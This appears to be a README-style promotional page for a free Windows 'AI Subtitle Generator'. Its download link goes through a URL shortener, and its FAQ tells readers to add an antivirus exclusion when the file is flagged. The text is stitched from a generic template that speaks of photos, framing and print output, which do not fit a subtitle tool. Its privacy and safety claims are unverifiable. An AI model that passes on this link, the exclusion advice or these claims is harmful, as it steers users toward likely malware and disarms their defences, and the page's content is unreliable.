# AI Subtitle Generator — Free Desktop Tool for Windows 10/11

![Version](https://img.shields.io/badge/Version-2026-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-informational?style=flat-square) ![Price](https://img.shields.io/badge/Price-Free-success?style=flat-square) ![Type](https://img.shields.io/badge/Type-AI_Tool-E53935?style=flat-square)

**AI Subtitle Generator** is a free Windows application that transcribe video into timed subtitles. It runs on your own PC with a bundled speech recognition model, so nothing you open ever leaves the machine. Output is SRT, VTT and ASS. **Free download, no subscription, works on Windows 10 and 11.**

<p align="center">
  <a href="https://share.google/dATZB7QL4w1VZ9U3t"><strong>⬇️ Download AI Subtitle Generator for Windows — Free</strong></a>
</p>

## 📊 Why This Build

| **Feature** | **Cloud tools** | **This app** |
| --- | --- | --- |
| **Price** | $10–$30 / month | ✅ Free |
| **Privacy** | Files uploaded | ✅ Stays local |
| **Limits** | Credits per month | ✅ Unlimited |
| **Watermark** | On free tier | ✅ None |
| **Offline** | No | ✅ Yes |
| **Speed** | Depends on queue | ✅ Depends on your GPU |

## 🎯 Feature List

| **Module** | **What it does** |
| --- | --- |
| **Import** | Drag and drop, or open a folder |
| **Preview** | Side-by-side before/after view |
| **Settings** | Strength, quality and format controls |
| **Batch queue** | Runs unattended across many files |
| **Export** | SRT, VTT and ASS |
| **Presets** | Save and reload your own settings |
| **History** | Re-run any previous job |

## ❓ Frequently Asked Questions

**Is AI Subtitle Generator free?**

Yes — completely free. No subscription, no credits, no account.

**Does it need internet?**

No. The speech recognition model is bundled and runs locally, so the app works fully offline after the first launch.

**Are my files uploaded anywhere?**

No. Nothing leaves your PC. That is the main difference from browser-based tools.

**What output formats are supported?**

SRT, VTT and ASS.

**Do I need a dedicated GPU?**

No. It runs on CPU as well, just slower. A modern NVIDIA GPU is several times faster.

**Does it work on Windows 11?**

Yes, on Windows 10 and 11 (64-bit).

**Why does my antivirus flag it?**

Local AI tools hook into the GPU and load model files, which antivirus software treats with suspicion. Add an exclusion for the folder.


## 📁 File Handling

**Supported inputs**

The importer accepts the common formats for its category and rejects anything
it cannot decode, rather than failing mid-run.

**Where output goes**

By default the app writes next to the source file, with a suffix so nothing is
overwritten. You can set a fixed output folder in settings.

**Batch behaviour**

| **Behaviour** | **Detail** |
| --- | --- |
| **Queue order** | Files process in the order added |
| **Failure handling** | A failed file is skipped, the queue continues |
| **Overwrite** | Never — outputs get a unique name |
| **Progress** | Per-file progress and a total estimate |

**Naming**

Outputs keep the original name plus a suffix, so a folder of 500 photos stays
traceable. Renaming rules can be changed in settings if you prefer a numbered
scheme.

**Cleanup**

Nothing is written outside the output folder and a small cache directory. To
remove the app completely, delete its folder — there is no installer, no
registry entry and no background service.


## 📊 Choosing the Right Preset

Three presets ship with the app. They trade speed against output quality.

| **Preset** | **Speed** | **Quality** | **VRAM** | **Best for** |
| --- | --- | --- | --- | --- |
| **Fast** | Fastest | Good | ~2 GB | Quick previews, large batches |
| **Balanced** | Medium | Very good | ~4 GB | Everyday work — start here |
| **Quality** | Slowest | Best | ~6 GB+ | Final output, print, archive |

**How to pick**

- Working on a laptop with integrated graphics? **Fast**.
- Mid-range GPU (GTX 1060 / RTX 3050)? **Balanced**.
- Desktop card with 8 GB+ VRAM? **Quality** for finals, **Balanced** while iterating.

**A practical workflow**

1. Run one file through **Fast** to check framing and settings.
2. Once it looks right, re-run the same file on **Quality**.
3. Batch the rest on **Quality** and leave it running.

That avoids spending an hour on a batch that had the wrong settings.


## 🔒 Privacy

This is the main reason people move from browser tools to a desktop app.

| **Question** | **Answer** |
| --- | --- |
| **Are files uploaded?** | No |
| **Is an account required?** | No |
| **Is usage tracked?** | No telemetry is sent |
| **Does it work offline?** | Yes, after first launch |
| **Where is data stored?** | Only in your output folder and local cache |

**What to check yourself**

- Disconnect from the network and run a job — it completes normally.
- Watch Task Manager's network column during processing — it stays flat.
- Check the app folder size — the models are there, which is why it works offline.

**Why this matters**

Photos, recordings and documents often contain personal or client material.
Keeping them on your own disk avoids the question of how long a third party
stores them, and avoids upload time on large files.

---

*subtitle-generator-desktop-app · Updated 2026-10-24 · Shared under the MIT License*

<!-- updated 2026-10-24 -->
